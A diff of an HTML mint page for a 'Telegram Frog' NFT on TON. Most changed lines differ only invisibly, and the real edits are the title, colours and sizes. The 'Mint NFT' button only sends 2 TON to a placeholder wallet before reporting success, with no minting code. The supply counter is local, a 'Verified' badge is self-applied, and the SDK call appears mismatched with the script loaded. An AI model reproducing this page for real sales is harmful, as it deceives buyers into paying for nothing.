@@ -1,139 +1,139 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mint Your NFT</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://unpkg.com/@tonconnect/sdk@latest"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.7.0/vanilla-tilt.min.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
-  <style>
-    body {
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(135deg, #1e3a8a, #4c1d95);
-      background-attachment: fixed;
-      color: #f1f5f9;
-      padding: 2rem;
-    }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telegram NFT</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/@tonconnect/sdk@latest"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-tilt/1.7.0/vanilla-tilt.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #1a237e, #4a148c, #880e4f);
+      background-attachment: fixed;
+      color: #f1f5f9;
+      padding: 2rem;
+    }
 
-    h1, h2, h3 {
-      color: #facc15;
-      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
-    }
+    h1, h2, h3 {
+      color: #facc15;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+    }
 
-    .sparkle::after {
-      content: '🐸';
-      position: absolute;
-      color: #FFD700;
-      font-size: 1.5rem;
-      opacity: 0;
-      animation: sparkle 0.5s ease-out forwards;
-    }
+    .sparkle::after {
+      content: '🐸';
+      position: absolute;
+      color: #FFD700;
+      font-size: 1.5rem;
+      opacity: 0;
+      animation: sparkle 0.5s ease-out forwards;
+    }
 
-    @keyframes sparkle {
-      0% { opacity: 0; transform: scale(0) translateY(0); }
-      50% { opacity: 1; transform: scale(1.5) translateY(-20px); }
-      100% { opacity: 0; transform: scale(0) translateY(-40px); }
-    }
-  </style>
+    @keyframes sparkle {
+      0% { opacity: 0; transform: scale(0) translateY(0); }
+      50% { opacity: 1; transform: scale(1.5) translateY(-20px); }
+      100% { opacity: 0; transform: scale(0) translateY(-40px); }
+    }
+  </style>
 </head>
 <body>
-  <div class="bg-white/10 backdrop-blur-lg rounded-2xl shadow-2xl p-6 max-w-md w-full mx-auto text-center relative z-10 border border-white/20">
-    <div class="tilt relative" style="perspective: 1000px;">
-      <img id="nftImage" src="https://iili.io/3DvIXqv.jpg" alt="NFT Image" class="rounded-xl w-full mb-4 transition-transform duration-300 cursor-pointer shadow-[0_0_25px_rgba(255,215,0,0.5)] bg-gradient-to-br from-yellow-600 to-yellow-800 p-2">
-    </div>
-    <div class="flex items-center justify-center mb-2">
-      <img src="https://iili.io/3DvIXqv.jpg" alt="Logo" class="w-10 h-10 rounded-full mr-2 border-2 border-green-400 shadow">
-      <h1 class="text-3xl font-extrabold flex items-center drop-shadow-md">
-        Telegram Frog 
-        <img src="https://iili.io/3DDTCBa.png" alt="Verified" class="w-5 h-5 ml-2">
-      </h1>
-    </div>
-    <p class="text-slate-300 mb-4 italic">Limited Edition NFTs on TON blockchain. Grab yours before it runs out!</p>
-    <p class="text-lg font-bold text-green-400 mb-2">💰 Price: 2 TON</p>
+  <div class="bg-white/10 backdrop-blur-lg rounded-2xl shadow-2xl p-6 max-w-md w-full mx-auto text-center relative z-10 border border-white/20">
+    <div class="tilt relative" style="perspective: 1000px;">
+      <img id="nftImage" src="https://iili.io/3DvIXqv.jpg" alt="NFT Image" class="rounded-xl w-full mb-4 transition-transform duration-300 cursor-pointer shadow-[0_0_25px_rgba(255,215,0,0.5)] bg-gradient-to-br from-yellow-600 to-yellow-800 p-2">
+    </div>
+    <div class="flex items-center justify-center mb-4">
+      <img src="https://iili.io/3DvIXqv.jpg" alt="Logo" class="w-8 h-8 rounded-full mr-2 border-2 border-green-400 shadow">
+      <h1 class="text-2xl font-extrabold flex items-center drop-shadow-md">
+        Telegram Frog
+        <img src="https://iili.io/3DDTCBa.png" alt="Verified" class="w-5 h-5 ml-2">
+      </h1>
+    </div>
+    <p class="text-slate-300 mb-4 italic">Limited Edition NFTs on TON blockchain. Grab yours before it runs out!</p>
+    <p class="text-lg font-bold text-green-400 mb-2">💰 Price: 2 TON</p>
 
-    <!-- Progress Bar -->
-    <div class="w-full bg-gray-700 rounded-full h-4 mb-4 overflow-hidden">
-      <div id="progressBar" class="bg-green-400 h-4 transition-all duration-300" style="width: 0%;"></div>
-    </div>
-    <p id="progressText" class="text-sm text-slate-300 mb-4 font-medium">Minted: 0 / 4444</p>
+    <!-- Progress Bar -->
+    <div class="w-full bg-gray-700 rounded-full h-4 mb-4 overflow-hidden">
+      <div id="progressBar" class="bg-green-400 h-4 transition-all duration-300" style="width: 0%;"></div>
+    </div>
+    <p id="progressText" class="text-sm text-slate-300 mb-4 font-medium">Minted: 0 / 4444</p>
 
-    <!-- Wallet + Mint Buttons -->
-    <button id="connectWallet" class="bg-purple-600 hover:bg-purple-700 w-full py-2 rounded-xl mb-3 font-semibold shadow-md transition-all">
-      Connect TON Wallet
-    </button>
+    <!-- Wallet + Mint Buttons -->
+    <button id="connectWallet" class="bg-purple-600 hover:bg-purple-700 w-full py-2 rounded-xl mb-3 font-semibold shadow-md transition-all">
+      Connect TON Wallet
+    </button>
 
-    <button id="mintNft" class="bg-green-600 hover:bg-green-700 w-full py-2 rounded-xl font-semibold shadow-md transition-all">
-      Mint NFT
-    </button>
+    <button id="mintNft" class="bg-green-600 hover:bg-green-700 w-full py-2 rounded-xl font-semibold shadow-md transition-all">
+      Mint NFT
+    </button>
 
-    <p id="status" class="text-sm text-slate-300 mt-4 italic"></p>
-  </div>
+    <p id="status" class="text-sm text-slate-300 mt-4 italic"></p>
+  </div>
 
-  <script>
-    const tonConnect = new TON_CONNECT_UI.TonConnectUI({
-      manifestUrl: "https://your-ton-bot.com/tonconnect-manifest.json",
-      buttonRootId: "connectWallet"
-    });
+  <script>
+    const tonConnect = new TON_CONNECT_UI.TonConnectUI({
+      manifestUrl: "https://your-ton-bot.com/tonconnect-manifest.json",
+      buttonRootId: "connectWallet"
+    });
 
-    let minted = 0;
-    const totalSupply = 4444;
-    const mintBtn = document.getElementById('mintNft');
-    const progressBar = document.getElementById('progressBar');
-    const progressText = document.getElementById('progressText');
-    const statusText = document.getElementById('status');
+    let minted = 0;
+    const totalSupply = 4444;
+    const mintBtn = document.getElementById('mintNft');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+    const statusText = document.getElementById('status');
 
-    function updateProgress() {
-      const percent = (minted / totalSupply) * 100;
-      progressBar.style.width = percent + '%';
-      progressText.textContent = `Minted: ${minted} / ${totalSupply}`;
-    }
+    function updateProgress() {
+      const percent = (minted / totalSupply) * 100;
+      progressBar.style.width = percent + '%';
+      progressText.textContent = `Minted: ${minted} / ${totalSupply}`;
+    }
 
-    updateProgress();
+    updateProgress();
 
-    mintBtn.addEventListener('click', async () => {
-      const wallet = await tonConnect.wallet();
-      if (!wallet) {
-        alert("Please connect your TON Wallet first.");
-        return;
-      }
+    mintBtn.addEventListener('click', async () => {
+      const wallet = await tonConnect.wallet();
+      if (!wallet) {
+        alert("Please connect your TON Wallet first.");
+        return;
+      }
 
-      try {
-        await tonConnect.sendTransaction({
-          validUntil: Math.floor(Date.now() / 1000) + 600,
-          messages: [{
-            address: "EQC_YOUR_RECEIVING_WALLET_ADDRESS",
-            amount: "2000000000", // 2 TON
-            payload: ""
-          }]
-        });
+      try {
+        await tonConnect.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 600,
+          messages: [{
+            address: "EQC_YOUR_RECEIVING_WALLET_ADDRESS",
+            amount: "2000000000", // 2 TON
+            payload: ""
+          }]
+        });
 
-        minted++;
-        updateProgress();
-        statusText.textContent = "✅ Mint successful!";
-      } catch (err) {
-        console.error(err);
-        statusText.textContent = "❌ Mint failed!";
-      }
-    });
+        minted++;
+        updateProgress();
+        statusText.textContent = "✅ Mint successful!";
+      } catch (err) {
+        console.error(err);
+        statusText.textContent = "❌ Mint failed!";
+      }
+    });
 
-    const nftImage = document.getElementById('nftImage');
-    VanillaTilt.init(document.querySelector('.tilt'), {
-      max: 25,
-      speed: 400,
-      glare: true,
-      "max-glare": 0.5,
-    });
+    const nftImage = document.getElementById('nftImage');
+    VanillaTilt.init(document.querySelector('.tilt'), {
+      max: 25,
+      speed: 400,
+      glare: true,
+      "max-glare": 0.5,
+    });
 
-    nftImage.addEventListener('click', (event) => {
-      const rect = nftImage.getBoundingClientRect();
-      const sparkle = document.createElement('span');
-      sparkle.classList.add('sparkle');
-      sparkle.style.left = (event.clientX - rect.left) + 'px';
-      sparkle.style.top = (event.clientY - rect.top) + 'px';
-      nftImage.parentElement.appendChild(sparkle);
-    });
-  </script>
+    nftImage.addEventListener('click', (event) => {
+      const rect = nftImage.getBoundingClientRect();
+      const sparkle = document.createElement('span');
+      sparkle.classList.add('sparkle');
+      sparkle.style.left = (event.clientX - rect.left) + 'px';
+      sparkle.style.top = (event.clientY - rect.top) + 'px';
+      nftImage.parentElement.appendChild(sparkle);
+    });
+  </script>
 </body>
 </html>
